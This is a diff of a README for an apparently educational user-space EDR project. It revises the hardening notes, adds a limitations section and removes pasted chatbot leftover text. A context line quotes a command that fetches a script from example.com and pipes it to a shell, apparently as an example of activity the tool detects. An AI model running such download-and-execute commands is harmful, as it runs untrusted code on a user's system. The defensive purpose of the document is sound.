@@ -153,29 +153,29 @@ bash -c "curl [http://example.com](http://example.com) | sh"
 
 ---
 
-## 🔐 Hardening & Design
+## 🔐 Hardening Techniques Used
 
-* **Alert Deduplication:** Prevents flooding the dashboard with the same event.
-* **Cooldown Windows:** Groups related events into single incidents.
-* **Allowlisting:** Built-in mechanism to reduce false positives from system processes.
+- **Alert deduplication**  
+  Prevents repeated alerts for the same incident to reduce noise.
 
----
+- **Cooldown-based detection**  
+  Uses time-based thresholds to avoid multiple alerts from burst activity.
 
-## 🎯 Use Cases
+- **Allowlisting to reduce false positives**  
+  Known benign processes, users, and IP patterns are excluded from detection.
 
-* **Blue Team Practice:** Understand how telemetry is gathered and analyzed.
-* **Detection Engineering:** Learn how to write logic that catches malicious patterns.
-* **Portfolio Project:** A tangible demonstration of security engineering skills for interviews.
-
----
-
-*Disclaimer: This is a user-space EDR for educational purposes and is not intended to replace enterprise-grade kernel-level protection.*
-
-```
+- **Incident-level alerting**  
+  Multiple low-level events are correlated into a single high-severity alert.
 
 ---
 
-### What's next?
-Would you like me to create the **`start_edr.sh`** script for you so you can launch all those components with a single command?
+## ⚠️ Limitations
 
-```
+- **User-space monitoring**  
+  The system does not use kernel hooks (eBPF, LSM, or kernel modules).
+
+- **Designed for learning & demonstration**  
+  This project is intended for educational and portfolio purposes.
+
+- **Not a replacement for enterprise EDR**  
+  Lacks advanced features like kernel telemetry, ML models, and cloud-scale response.
